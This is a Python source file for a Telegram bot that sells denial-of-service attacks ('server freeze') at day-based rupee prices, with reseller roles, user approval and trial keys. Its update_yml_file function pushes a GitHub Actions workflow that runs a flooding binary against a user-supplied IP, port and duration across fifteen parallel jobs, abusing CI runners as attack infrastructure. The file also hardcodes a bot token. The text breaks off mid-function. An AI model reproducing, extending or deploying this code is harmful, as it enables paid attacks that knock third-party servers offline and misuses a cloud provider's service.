import os
import json
import logging
import threading
import time
import random
import string
from datetime import datetime, timedelta
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, ContextTypes, MessageHandler, filters, CallbackQueryHandler
from github import Github, GithubException

logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
logger = logging.getLogger(__name__)

BOT_TOKEN = "8579474154:AAH16AmOzDPQGlCz14-D10PdZLWnrVTsssY"
YML_FILE_PATH = ".github/workflows/main.yml"
BINARY_FILE_NAME = "soul"
OWNER_IDS = [8101867786]

current_attack = None
attack_lock = threading.Lock()
cooldown_until = 0
COOLDOWN_DURATION = 40
MAINTENANCE_MODE = False
MAX_ATTACKS = 100
user_attack_counts = {}

USER_PRICES = {"1": 120, "2": 240, "3": 360, "4": 450, "7": 650}
RESELLER_PRICES = {"1": 150, "2": 250, "3": 300, "4": 400, "7": 550}

def load_json(filename, default):
    try:
        with open(filename, 'r') as f:
            data = json.load(f)
            return data if data else default
    except FileNotFoundError:
        return default

def save_json(filename, data):
    with open(filename, 'w') as f:
        json.dump(data, f, indent=2)

approved_users = load_json('approved_users.json', {})
owners = load_json('owners.json', {})
admins = load_json('admins.json', {})
resellers = load_json('resellers.json', {})
github_tokens = load_json('github_tokens.json', [])
groups = load_json('groups.json', {})
pending_users = load_json('pending_users.json', [])
trial_keys = load_json('trial_keys.json', {})
user_attack_counts = load_json('user_attack_counts.json', {})

if not owners:
    for owner_id in OWNER_IDS:
        owners[str(owner_id)] = {"username": f"owner_{owner_id}", "added_by": "system", "added_date": time.strftime("%Y-%m-%d %H:%M:%S"), "is_primary": True}
    save_json('owners.json', owners)

MAINTENANCE_MODE = load_json('maintenance.json', {"maintenance": False}).get("maintenance", False)
COOLDOWN_DURATION = load_json('cooldown.json', {"cooldown": 40}).get("cooldown", 40)
MAX_ATTACKS = load_json('max_attacks.json', {"max_attacks": 100}).get("max_attacks", 100)

def is_owner(user_id):
    return str(user_id) in owners

def is_admin(user_id):
    return str(user_id) in admins

def is_reseller(user_id):
    return str(user_id) in resellers

def is_approved_user(user_id):
    user_id_str = str(user_id)
    if user_id_str in approved_users:
        expiry = approved_users[user_id_str].get('expiry')
        if expiry == "LIFETIME":
            return True
        if time.time() < expiry:
            return True
        del approved_users[user_id_str]
        save_json('approved_users.json', approved_users)
    return False

def can_user_attack(user_id):
    return (is_owner(user_id) or is_admin(user_id) or is_reseller(user_id) or is_approved_user(user_id)) and not MAINTENANCE_MODE

def update_yml_file(token, repo_name, ip, port, time_val):
    yml_content = f"""name: soul Attack
on: [push]
jobs:
  soul:
    runs-on: ubuntu-22.04
    strategy:
      matrix:
        n: [1,2,3,4,5,6,7,8,9,10,11,12,13,14,15]
    steps:
    - uses: actions/checkout@v3
    - run: chmod +x soul
    - run: sudo ./soul {ip} {port} {time_val}
"""
    try:
        g = Github(token)
        repo = g.get_repo(repo_name)
        try:
            file_content = repo.get_contents(YML_FILE_PATH)
            repo.update_file(YML_FILE_PATH, f"Update attack {ip}:{port}", yml_content, file_content.sha)
        except:
            repo.create_file(YML_FILE_PATH, f"Create attack {ip}:{port}", yml_content)
        return True
    except Exception as e:
        logger.error(f"Error: {e}")
        return False

def instant_stop_all_jobs(token, repo_name):
    try:
        g = Github(token)
        repo = g.get_repo(repo_name)
        total_cancelled = 0
        for status in ['queued', 'in_progress', 'pending']:
            try:
                workflows = repo.get_workflow_runs(status=status)
                for workflow in workflows:
                    try:
                        workflow.cancel()
                        total_cancelled += 1
                    except:
                        pass
            except:
                pass
        return total_cancelled
    except:
        return 0

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global current_attack, cooldown_until
    user = update.effective_user
    user_id = user.id
    first_name = user.first_name
    username = user.username or "user"
    
    chat_type = update.effective_chat.type
    if chat_type in ['group', 'supergroup']:
        chat_id = str(update.effective_chat.id)
        if chat_id not in groups:
            groups[chat_id] = {"name": update.effective_chat.title, "added_date": time.strftime("%Y-%m-%d %H:%M:%S")}
            save_json('groups.json', groups)
    
    if not can_user_attack(user_id):
        user_exists = any(str(u['user_id']) == str(user_id) for u in pending_users)
        if not user_exists:
            pending_users.append({"user_id": user_id, "username": username, "request_date": time.strftime("%Y-%m-%d %H:%M:%S")})
            save_json('pending_users.json', pending_users)
            for owner_id in owners.keys():
                try:
                    await context.bot.send_message(chat_id=int(owner_id), text=f"━━━━━━━━━━━━━━━━━━\n👤 𝗡𝗘𝗪 𝗔𝗖𝗖𝗘𝗦𝗦 𝗥𝗘𝗤𝗨𝗘𝗦𝗧\n━━━━━━━━━━━━━━━━━━\n\n👤 ɴᴀᴍᴇ: {first_name}\n🆔 ᴜsᴇʀɴᴀᴍᴇ: @{username}\n🔢 ɪᴅ: `{user_id}`\n\n⚡ ᴀᴘᴘʀᴏᴠᴇ: /add {user_id} 7")
                except:
                    pass
        
        text = f"━━━━━━━━━━━━━━━━━━\n🔐 𝗔𝗖𝗖𝗘𝗦𝗦 𝗗𝗘𝗡𝗜𝗘𝗗\n━━━━━━━━━━━━━━━━━━\n\n❌ ʏᴏᴜ ᴅᴏɴ'ᴛ ʜᴀᴠᴇ ᴀᴄᴄᴇss ᴛᴏ ᴛʜɪs ʙᴏᴛ\n\n📋 ʏᴏᴜʀ ʀᴇǫᴜᴇsᴛ ʜᴀs ʙᴇᴇɴ sᴇɴᴛ ᴛᴏ ᴀᴅᴍɪɴ\n⏳ ᴘʟᴇᴀsᴇ ᴡᴀɪᴛ ғᴏʀ ᴀᴘᴘʀᴏᴠᴀʟ\n\n🆔 ʏᴏᴜʀ ɪᴅ: `{user_id}`"
        keyboard = [[InlineKeyboardButton("🔄 ʀᴇғʀᴇsʜ", callback_data="main_menu")]]
        if update.message:
            await update.message.reply_text(text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')
        else:
            await update.callback_query.message.edit_text(text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')
        return
    
    remaining = MAX_ATTACKS - user_attack_counts.get(str(user_id), 0)
    
    if is_owner(user_id):
        role = "👑 ᴏᴡɴᴇʀ"
    elif is_admin(user_id):
        role = "⚡ ᴀᴅᴍɪɴ"
    elif is_reseller(user_id):
        role = "💎 ʀᴇsᴇʟʟᴇʀ"
    else:
        role = "✨ ᴜsᴇʀ"
    
    status = "🔴 ᴀᴛᴛᴀᴄᴋɪɴɢ" if current_attack else "🟢 ʀᴇᴀᴅʏ"
    cooldown_text = ""
    if time.time() < cooldown_until:
        remaining_cd = int(cooldown_until - time.time())
        cooldown_text = f"\n⏳ ᴄᴏᴏʟᴅᴏᴡɴ: {remaining_cd}s"
    
    text = f"""━━━━━━━━━━━━━━━━━━
⚡ 𝗦𝗘𝗥𝗩𝗘𝗥 𝗙𝗥𝗘𝗘𝗭𝗘 𝗕𝗢𝗧
━━━━━━━━━━━━━━━━━━

👋 ᴡᴇʟᴄᴏᴍᴇ, [{first_name}](tg://user?id={user_id})

━━━━━━━━━━━━━━━━━━
📊 𝗬𝗢𝗨𝗥 𝗜𝗡𝗙𝗢
━━━━━━━━━━━━━━━━━━
👤 ʀᴏʟᴇ: {role}
🔢 ᴜsᴇʀ ɪᴅ: `{user_id}`
🎯 ᴀᴛᴛᴀᴄᴋs: {remaining}/{MAX_ATTACKS}
📡 sᴛᴀᴛᴜs: {status}{cooldown_text}

━━━━━━━━━━━━━━━━━━
🎮 𝗤𝗨𝗜𝗖𝗞 𝗔𝗖𝗧𝗜𝗢𝗡𝗦
━━━━━━━━━━━━━━━━━━"""
    
    keyboard = [
        [InlineKeyboardButton("🚀 ʟᴀᴜɴᴄʜ ᴀᴛᴛᴀᴄᴋ", callback_data="launch_attack")],
        [InlineKeyboardButton("📊 ᴄʜᴇᴄᴋ sᴛᴀᴛᴜs", callback_data="status"), InlineKeyboardButton("🛑 sᴛᴏᴘ ᴀᴛᴛᴀᴄᴋ", callback_data="stop_attack")],
        [InlineKeyboardButton("🔑 ᴍʏ ᴀᴄᴄᴇss", callback_data="my_access"), InlineKeyboardButton("💰 ᴘʀɪᴄɪɴɢ", callback_data="pricing")]
    ]
    
    if is_owner(user_id) or is_admin(user_id):
        keyboard.append([InlineKeyboardButton("👥 ᴜsᴇʀs", callback_data="users_menu"), InlineKeyboardButton("⚙️ sᴇᴛᴛɪɴɢs", callback_data="settings_menu")])
    
    if is_owner(user_id):
        keyboard.append([InlineKeyboardButton("👑 ᴏᴡɴᴇʀ ᴘᴀɴᴇʟ", callback_data="owner_menu"), InlineKeyboardButton("🔐 ᴛᴏᴋᴇɴs", callback_data="tokens_menu")])
    
    keyboard.append([InlineKeyboardButton("❓ ʜᴇʟᴘ", callback_data="help")])
    
    if update.message:
        await update.message.reply_text(text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')
    else:
        await update.callback_query.message.edit_text(text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')

async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global current_attack, cooldown_until, MAINTENANCE_MODE, COOLDOWN_DURATION, MAX_ATTACKS
    query = update.callback_query
    await query.answer()
    user_id = update.effective_user.id
    data = query.data
    
    if data == "main_menu":
        context.user_data.clear()
        await start(update, context)
        
    elif data == "launch_attack":
        if not can_user_attack(user_id):
            await query.message.edit_text("━━━━━━━━━━━━━━━━━━\n❌ 𝗔𝗖𝗖𝗘𝗦𝗦 𝗗𝗘𝗡𝗜𝗘𝗗\n━━━━━━━━━━━━━━━━━━\n\nʏᴏᴜ ᴅᴏɴ'ᴛ ʜᴀᴠᴇ ᴘᴇʀᴍɪssɪᴏɴ", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 ʙᴀᴄᴋ", callback_data="main_menu")]]), parse_mode='Markdown')
            return
        
        if MAINTENANCE_MODE:
            await query.message.edit_text("━━━━━━━━━━━━━━━━━━\n🔧 𝗠𝗔𝗜𝗡𝗧𝗘𝗡𝗔𝗡𝗖𝗘\n━━━━━━━━━━━━━━━━━━\n\nʙᴏᴛ ɪs ᴜɴᴅᴇʀ ᴍᴀɪɴᴛᴇɴᴀɴᴄᴇ", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 ʙᴀᴄᴋ", callback_data="main_menu")]]), parse_mode='Markdown')
            return
        
        if current_attack:
            remaining = int(current_attack['estimated_end_time'] - time.time())
            await query.message.edit_text(f"━━━━━━━━━━━━━━━━━━\n⚠️ 𝗔𝗧𝗧𝗔𝗖𝗞 𝗥𝗨𝗡𝗡𝗜𝗡𝗚\n━━━━━━━━━━━━━━━━━━\n\n🎯 ᴛᴀʀɢᴇᴛ: `{current_attack['ip']}:{current_attack['port']}`\n⏱️ ʀᴇᴍᴀɪɴɪɴɢ: {remaining}s", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 ʙᴀᴄᴋ", callback_data="main_menu")]]), parse_mode='Markdown')
            return
        
        if time.time() < cooldown_until:
            remaining_cd = int(cooldown_until - time.time())
            await query.message.edit_text(f"━━━━━━━━━━━━━━━━━━\n⏳ 𝗖𝗢𝗢𝗟𝗗𝗢𝗪𝗡 𝗔𝗖𝗧𝗜𝗩𝗘\n━━━━━━━━━━━━━━━━━━\n\nᴡᴀɪᴛ: {remaining_cd}s", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 ʙᴀᴄᴋ", callback_data="main_menu")]]), parse_mode='Markdown')
            return
        
        context.user_data['attack_step'] = 'ip'
        text = """━━━━━━━━━━━━━━━━━━
🚀 𝗟𝗔𝗨𝗡𝗖𝗛 𝗔𝗧𝗧𝗔𝗖𝗞
━━━━━━━━━━━━━━━━━━

📍 sᴛᴇᴘ 1/3: ᴇɴᴛᴇʀ ɪᴘ ᴀᴅᴅʀᴇss

💡 ᴇxᴀᴍᴘʟᴇ: `192.168.1.1`

⚠️ ɴᴏᴛᴇ: ɪᴘs sᴛᴀʀᴛɪɴɢ ᴡɪᴛʜ 15 ᴏʀ 96 ᴀʀᴇ ʙʟᴏᴄᴋᴇᴅ"""
        keyboard = [[InlineKeyboardButton("❌ ᴄᴀɴᴄᴇʟ", callback_data="main_menu")]]
        await query.message.edit_text(text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')
        
    elif data == "status":
        if current_attack:
            elapsed = int(time.time() - current_attack['start_time'])
            remaining = int(current_attack['estimated_end_time'] - time.time())
            text = f"""━━━━━━━━━━━━━━━━━━
📊 𝗔𝗧𝗧𝗔𝗖𝗞 𝗦𝗧𝗔𝗧𝗨𝗦
━━━━━━━━━━━━━━━━━━

🔴 sᴛᴀᴛᴜs: ᴀᴄᴛɪᴠᴇ
🎯 ᴛᴀʀɢᴇᴛ: `{current_attack['ip']}:{current_attack['port']}`
⚡ ᴍᴇᴛʜᴏᴅ: ʙɢᴍ ғʟᴏᴏᴅ
⏱️ ᴅᴜʀᴀᴛɪᴏɴ: {current_attack['time']}s
⏳ ʀᴇᴍᴀɪɴɪɴɢ: {remaining}s
✅ ᴇʟᴀᴘsᴇᴅ: {elapsed}s"""
        else:
            if time.time() < cooldown_until:
                remaining_cd = int(cooldown_until - time.time())
                text = f"""━━━━━━━━━━━━━━━━━━
📊 𝗦𝗬𝗦𝗧𝗘𝗠 𝗦𝗧𝗔𝗧𝗨𝗦
━━━━━━━━━━━━━━━━━━

🟡 sᴛᴀᴛᴜs: ᴄᴏᴏʟᴅᴏᴡɴ
⏳ ᴡᴀɪᴛ: {remaining_cd}s
🔥 ᴍᴀx ᴀᴛᴛᴀᴄᴋs: {MAX_ATTACKS}
⚙️ ᴍᴀɪɴᴛᴇɴᴀɴᴄᴇ: {'ᴏɴ' if MAINTENANCE_MODE else 'ᴏғғ'}"""
            else:
                text = f"""━━━━━━━━━━━━━━━━━━
📊 𝗦𝗬𝗦𝗧𝗘𝗠 𝗦𝗧𝗔𝗧𝗨𝗦
━━━━━━━━━━━━━━━━━━

🟢 sᴛᴀᴛᴜs: ʀᴇᴀᴅʏ
🔥 ᴍᴀx ᴀᴛᴛᴀᴄᴋs: {MAX_ATTACKS}
⚙️ ᴍᴀɪɴᴛᴇɴᴀɴᴄᴇ: {'ᴏɴ' if MAINTENANCE_MODE else 'ᴏғғ'}
💚 ᴀʟʟ sʏsᴛᴇᴍs ᴏᴘᴇʀᴀᴛɪᴏɴᴀʟ"""
        keyboard = [[InlineKeyboardButton("🔄 ʀᴇғʀᴇsʜ", callback_data="status"), InlineKeyboardButton("🔙 ʙᴀᴄᴋ", callback_data="main_menu")]]
        await query.message.edit_text(text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')
        
    elif data == "stop_attack":
        if not current_attack:
            await query.message.edit_text("━━━━━━━━━━━━━━━━━━\n⚠️ 𝗡𝗢 𝗔𝗧𝗧𝗔𝗖𝗞\n━━━━━━━━━━━━━━━━━━\n\nɴᴏ ᴀᴄᴛɪᴠᴇ ᴀᴛᴛᴀᴄᴋ ғᴏᴜɴᴅ", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 ʙᴀᴄᴋ", callback_data="main_menu")]]), parse_mode='Markdown')
            return
        
        progress = await query.message.edit_text("━━━━━━━━━━━━━━━━━━\n🛑 𝗦𝗧𝗢𝗣𝗣𝗜𝗡𝗚\n━━━━━━━━━━━━━━━━━━\n\nᴘʟᴇᴀsᴇ ᴡᴀɪᴛ...", parse_mode='Markdown')
        
        total_stopped = 0
        threads = []
        results = []
        
        def stop_single(token_data):
            stopped = instant_stop_all_jobs(token_data['token'], token_data['repo'])
            results.append(stopped)
        
        for token_data in github_tokens:
            thread = threading.Thread(target=stop_single, args=(token_data,))
            threads.append(thread)
            thread.start()
        
        for thread in threads:
            thread.join()
        
        total_stopped = sum(results)
        
        with attack_lock:
            stopped_attack = current_attack
            current_attack = None
            cooldown_until = time.time() + COOLDOWN_DURATION
        
        text = f"""━━━━━━━━━━━━━━━━━━
✅ 𝗔𝗧𝗧𝗔𝗖𝗞 𝗦𝗧𝗢𝗣𝗣𝗘𝗗
━━━━━━━━━━━━━━━━━━

🎯 ᴛᴀʀɢᴇᴛ: `{stopped_attack['ip']}:{stopped_attack['port']}`
🛑 ᴡᴏʀᴋғʟᴏᴡs: {total_stopped}
🔧 sᴇʀᴠᴇʀs: {len(github_tokens)}
⏳ ᴄᴏᴏʟᴅᴏᴡɴ: {COOLDOWN_DURATION}s"""
        keyboard = [[InlineKeyboardButton("🔙 ʙᴀᴄᴋ", callback_data="main_menu")]]
        await progress.edit_text(text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')
        
    elif data == "my_access":
        if is_owner(user_id):
            role = "👑 ᴏᴡɴᴇʀ"
            expiry = "ʟɪғᴇᴛɪᴍᴇ"
        elif is_admin(user_id):
            role = "⚡ ᴀᴅᴍɪɴ"
            expiry = "ʟɪғᴇᴛɪᴍᴇ"
        elif is_reseller(user_id):
            role = "💎 ʀᴇsᴇʟʟᴇʀ"
            expiry = "ʟɪғᴇᴛɪᴍᴇ"
        elif is_approved_user(user_id):
            role = "✨ ᴜsᴇʀ"
            user_data = approved_users.get(str(user_id), {})
            exp = user_data.get('expiry', 0)
            if exp == "LIFETIME":
                expiry = "ʟɪғᴇᴛɪᴍᴇ"
            else:
                days_left = int((exp - time.time()) / 86400)
                hours_left = int(((exp - time.time()) % 86400) / 3600)
                expiry = f"{days_left}ᴅ {hours_left}ʜ"
        else:
            role = "⏳ ᴘᴇɴᴅɪɴɢ"
            expiry = "ᴡᴀɪᴛɪɴɢ"
        
        remaining = MAX_ATTACKS - user_attack_counts.get(str(user_id), 0)
        text = f"""━━━━━━━━━━━━━━━━━━
🔐 𝗬𝗢𝗨𝗥 𝗔𝗖𝗖𝗘𝗦𝗦
━━━━━━━━━━━━━━━━━━

👤 ʀᴏʟᴇ: {role}
🆔 ᴜsᴇʀ ɪᴅ: `{user_id}`
👤 ᴜsᴇʀɴᴀᴍᴇ: @{update.effective_user.username or 'ɴᴏɴᴇ'}
📅 ᴇxᴘɪʀʏ: {expiry}
🎯 ᴀᴛᴛᴀᴄᴋs: {remaining}/{MAX_ATTACKS}
✅ sᴛᴀᴛᴜs: {'ᴀᴄᴛɪᴠᴇ' if can_user_attack(user_id) else 'ɪɴᴀᴄᴛɪᴠᴇ'}"""
        keyboard = [[InlineKeyboardButton("🔙 ʙᴀᴄᴋ", callback_data="main_menu")]]
        await query.message.edit_text(text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')
        
    elif data == "pricing":
        text = """━━━━━━━━━━━━━━━━━━
💰 𝗣𝗥𝗜𝗖𝗜𝗡𝗚 𝗣𝗟𝗔𝗡𝗦
━━━━━━━━━━━━━━━━━━

✨ 1 ᴅᴀʏ  → ₹120
✨ 2 ᴅᴀʏs → ₹240
✨ 3 ᴅᴀʏs → ₹360
✨ 4 ᴅᴀʏs → ₹450
✨ 7 ᴅᴀʏs → ₹650

━━━━━━━━━━━━━━━━━━
💎 ʀᴇsᴇʟʟᴇʀ ᴘʀɪᴄɪɴɢ
━━━━━━━━━━━━━━━━━━

💎 1 ᴅᴀʏ  → ₹150
💎 2 ᴅᴀʏs → ₹250
💎 3 ᴅᴀʏs → ₹300
💎 4 ᴅᴀʏs → ₹400
💎 7 ᴅᴀʏs → ₹550

📞 ᴄᴏɴᴛᴀᴄᴛ ᴀᴅᴍɪɴ ғᴏʀ ᴘᴜʀᴄʜᴀsᴇ"""
        keyboard = [[InlineKeyboardButton("🔙 ʙᴀᴄᴋ", callback_data="main_menu")]]
        await query.message.edit_text(text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')
        
    elif data == "help":
        if is_owner(user_id) or is_admin(user_id):
            text = """━━━━━━━━━━━━━━━━━━
❓ 𝗛𝗘𝗟𝗣 & 𝗖𝗢𝗠𝗠𝗔𝗡𝗗𝗦
━━━━━━━━━━━━━━━━━━

👤 ᴜsᴇʀ ᴄᴏᴍᴍᴀɴᴅs:
• /start - sᴛᴀʀᴛ ʙᴏᴛ
• /id - ɢᴇᴛ ʏᴏᴜʀ ɪᴅ
• /myaccess - ᴄʜᴇᴄᴋ ᴀᴄᴄᴇss
• /redeem - ʀᴇᴅᴇᴇᴍ ᴋᴇʏ

⚡ ᴀᴅᴍɪɴ ᴄᴏᴍᴍᴀɴᴅs:
• /add <id> <days>
• /remove <id>
• /broadcast <msg>
• /maintenance <on/off>
• /setcooldown <sec>
• /setmaxattack <num>
• /genkey <hours>

🔐 ᴏᴡɴᴇʀ ᴄᴏᴍᴍᴀɴᴅs:
• /addtoken <token>
• /removetoken <num>
• /tokens - ʟɪsᴛ ᴛᴏᴋᴇɴs
• /binary_upload"""
        else:
            text = """━━━━━━━━━━━━━━━━━━
❓ 𝗛𝗘𝗟𝗣 & 𝗖𝗢𝗠𝗠𝗔𝗡𝗗𝗦
━━━━━━━━━━━━━━━━━━

• /start - sᴛᴀʀᴛ ʙᴏᴛ
• /id - ɢᴇᴛ ʏᴏᴜʀ ɪᴅ
• /myaccess - ᴄʜᴇᴄᴋ ᴀᴄᴄᴇss
• /redeem <key> - ᴜsᴇ ᴛʀɪᴀʟ ᴋᴇʏ

💡 ᴜsᴇ ʙᴜᴛᴛᴏɴs ғᴏʀ ᴀᴛᴛᴀᴄᴋ"""
        keyboard = [[InlineKeyboardButton("🔙 ʙᴀᴄᴋ", callback_data="main_menu")]]
        await query.message.edit_text(text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')
        
    elif data == "users_menu":
        if not is_owner(user_id) and not is_admin(user_id):
            await query.message.edit_text("❌ ᴀᴄᴄᴇss ᴅᴇɴɪᴇᴅ", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 ʙᴀᴄᴋ", callback_data="main_menu")]]), parse_mode='Markdown')
            return
        
        text = """━━━━━━━━━━━━━━━━━━
👥 𝗨𝗦𝗘𝗥 𝗠𝗔𝗡𝗔𝗚𝗘𝗠𝗘𝗡𝗧
━━━━━━━━━━━━━━━━━━

ᴍᴀɴᴀɢᴇ ᴜsᴇʀs, ᴀᴘᴘʀᴏᴠᴀʟs & ᴘᴇʀᴍɪssɪᴏɴs"""
        keyboard = [
            [InlineKeyboardButton("📋 ᴘᴇɴᴅɪɴɢ ʀᴇǫᴜᴇsᴛs", callback_data="pending_list")],
            [InlineKeyboardButton("✅ ᴀᴘᴘʀᴏᴠᴇᴅ ᴜsᴇʀs", callback_data="approved_list")],
            [InlineKeyboardButton("🔙 ʙᴀᴄᴋ", callback_data="main_menu")]
        ]
        await query.message.edit_text(text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')
        
    elif data == "pending_list":
        if not is_owner(user_id) and not is_admin(user_id):
            await query.message.edit_text("❌ ᴀᴄᴄᴇss ᴅᴇɴɪᴇᴅ", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 ʙᴀᴄᴋ", callback_data="users_menu")]]), parse_mode='Markdown')
            return
        
        if not pending_users:
            await query.message.edit_text("━━━━━━━━━━━━━━━━━━\n📭 𝗡𝗢 𝗣𝗘𝗡𝗗𝗜𝗡𝗚 𝗥𝗘𝗤𝗨𝗘𝗦𝗧𝗦\n━━━━━━━━━━━━━━━━━━\n\nɴᴏ ᴘᴇɴᴅɪɴɢ ᴀᴘᴘʀᴏᴠᴀʟs", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 ʙᴀᴄᴋ", callback_data="users_menu")]]), parse_mode='Markdown')
            return
        
        text = f"""━━━━━━━━━━━━━━━━━━
⏳ 𝗣𝗘𝗡𝗗𝗜𝗡𝗚 𝗥𝗘𝗤𝗨𝗘𝗦𝗧𝗦
━━━━━━━━━━━━━━━━━━

📊 ᴛᴏᴛᴀʟ: {len(pending_users)}

"""
        keyboard = []
        for user in pending_users[:10]:
            text += f"👤 @{user['username']}\n🆔 `{user['user_id']}`\n\n"
            keyboard.append([InlineKeyboardButton(f"✅ ᴀᴘᴘʀᴏᴠᴇ @{user['username']}", callback_data=f"approve_{user['user_id']}")])
        
        text += "💡 ᴄʟɪᴄᴋ ʙᴜᴛᴛᴏɴ ᴛᴏ ᴀᴘᴘʀᴏᴠᴇ (7 ᴅᴀʏs)"
        keyboard.append([InlineKeyboardButton("🔙 ʙᴀᴄᴋ", callback_data="users_menu")])
        await query.message.edit_text(text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')
        
    elif data.startswith("approve_"):
        if not is_owner(user_id) and not is_admin(user_id):
            return
        
        target_id = int(data.replace("approve_", ""))
        pending_users[:] = [u for u in pending_users if str(u['user_id']) != str(target_id)]
        save_json('pending_users.json', pending_users)
        
        expiry = time.time() + (7 * 86400)
        approved_users[str(target_id)] = {
            "username": f"user_{target_id}",
            "added_by": user_id,
            "added_date": time.strftime("%Y-%m-%d %H:%M:%S"),
            "expiry": expiry,
            "days": 7
        }
        save_json('approved_users.json', approved_users)
        
        try:
            await context.bot.send_message(chat_id=target_id, text="━━━━━━━━━━━━━━━━━━\n✅ 𝗔𝗖𝗖𝗘𝗦𝗦 𝗔𝗣𝗣𝗥𝗢𝗩𝗘𝗗\n━━━━━━━━━━━━━━━━━━\n\n🎉 ʏᴏᴜʀ ᴀᴄᴄᴇss ʜᴀs ʙᴇᴇɴ ᴀᴘᴘʀᴏᴠᴇᴅ!\n⏱️ ᴅᴜʀᴀᴛɪᴏɴ: 7 ᴅᴀʏs\n\n💡 ᴜsᴇ /start ᴛᴏ ʙᴇɢɪɴ", parse_mode='Markdown')
        except:
            pass
        
        await query.message.edit_text(f"━━━━━━━━━━━━━━━━━━\n✅ 𝗨𝗦𝗘𝗥 𝗔𝗣𝗣𝗥𝗢𝗩𝗘𝗗\n━━━━━━━━━━━━━━━━━━\n\n🆔 ɪᴅ: `{target_id}`\n⏱️ ᴅᴜʀᴀᴛɪᴏɴ: 7 ᴅᴀʏs\n👤 ʙʏ: {user_id}", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("📋 ᴠɪᴇᴡ ᴘᴇɴᴅɪɴɢ", callback_data="pending_list"), InlineKeyboardButton("🔙 ʙᴀᴄᴋ", callback_data="users_menu")]]), parse_mode='Markdown')

async def handle_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global current_attack, cooldown_until
    user_id = update.effective_user.id
    text = update.message.text
    
    if text.startswith('/'):
        return
    
    if 'attack_step' in context.user_data:
        step = context.user_data['attack_step']
        
        if step == 'ip':
            ip = text.strip()
            if ip.startswith(('15', '96')):
                await update.message.reply_text("━━━━━━━━━━━━━━━━━━\n❌ 𝗜𝗡𝗩𝗔𝗟𝗜𝗗 𝗜𝗣\n━━━━━━━━━━━━━━━━━━\n\nɪᴘs sᴛᴀʀᴛɪɴɢ ᴡɪᴛʜ 15/96 ᴀʀᴇ ʙʟᴏᴄᴋᴇᴅ", parse_mode='Markdown')
                return
            
            context.user_data['target_ip'] = ip
            context.user_data['attack_step'] = 'port'
            text = f"""━━━━━━━━━━━━━━━━━━
🚀 𝗟𝗔𝗨𝗡𝗖𝗛 𝗔𝗧𝗧𝗔𝗖𝗞
━━━━━━━━━━━━━━━━━━

✅ ɪᴘ: `{ip}`

📍 sᴛᴇᴘ 2/3: ᴇɴᴛᴇʀ ᴘᴏʀᴛ

💡 ᴇxᴀᴍᴘʟᴇ: `80`"""
            await update.message.reply_text(text, parse_mode='Markdown')
            
        elif step == 'port':
            try:
                port = int(text.strip())
                if port < 1 or port > 65535:
                    raise ValueError
            except:
                await update.message.reply_text("━━━━━━━━━━━━━━━━━━\n❌ 𝗜𝗡𝗩𝗔𝗟𝗜𝗗 𝗣𝗢𝗥𝗧\n━━━━━━━━━━━━━━━━━━\n\nᴘᴏʀᴛ ᴍᴜsᴛ ʙᴇ 1-65535", parse_mode='Markdown')
                return
            
            context.user_data['target_port'] = port
            context.user_data['attack_step'] = 'duration'
            text = f"""━━━━━━━━━━━━━━━━━━
🚀 𝗟𝗔𝗨𝗡𝗖𝗛 𝗔𝗧𝗧𝗔𝗖𝗞
━━━━━━━━━━━━━━━━━━

✅ ɪᴘ: `{context.user_data['target_ip']}`
✅ ᴘᴏʀᴛ: `{port}`

📍 sᴛᴇᴘ 3/3: ᴇɴᴛᴇʀ ᴅᴜʀᴀᴛɪᴏɴ (sᴇᴄᴏɴᴅs)

💡 ᴇxᴀᴍᴘʟᴇ: `120`"""
            await update.message.reply_text(text, parse_mode='Markdown')
            
        elif step == 'duration':
            try:
                duration = int(text.strip())
                if duration < 1:
                    raise ValueError
            except:
                await update.message.reply_text("━━━━━━━━━━━━━━━━━━\n❌ 𝗜𝗡𝗩𝗔𝗟𝗜𝗗 𝗗𝗨𝗥𝗔𝗧𝗜𝗢𝗡\n━━━━━━━━━━━━━━━━━━\n\nᴍᴜsᴛ ʙᴇ ᴘᴏsɪᴛɪᴠᴇ ɴᴜᴍʙᴇʀ", parse_mode='Markdown')
                return
            
            ip = context.user_data['target_ip']
            port = context.user_data['target_port']
            
            if not github_tokens:
                await update.message.reply_text("━━━━━━━━━━━━━━━━━━\n❌ 𝗡𝗢 𝗦𝗘𝗥𝗩𝗘𝗥𝗦\n━━━━━━━━━━━━━━━━━━\n\nɴᴏ sᴇʀᴠᴇʀs ᴀᴠᴀɪʟᴀʙʟᴇ", parse_mode='Markdown')
                context.user_data.clear()
                return
            
            with attack_lock:
                current_attack = {
                    'ip': ip,
                    'port': port,
                    'time': duration,
                    'user_id': user_id,
                    'start_time': time.time(),
                    'estimated_end_time': time.time() + duration
                }
            
            user_attack_counts[str(user_id)] = user_attack_counts.get(str(user_id), 0) + 1
            save_json('user_attack_counts.json', user_attack_counts)
            
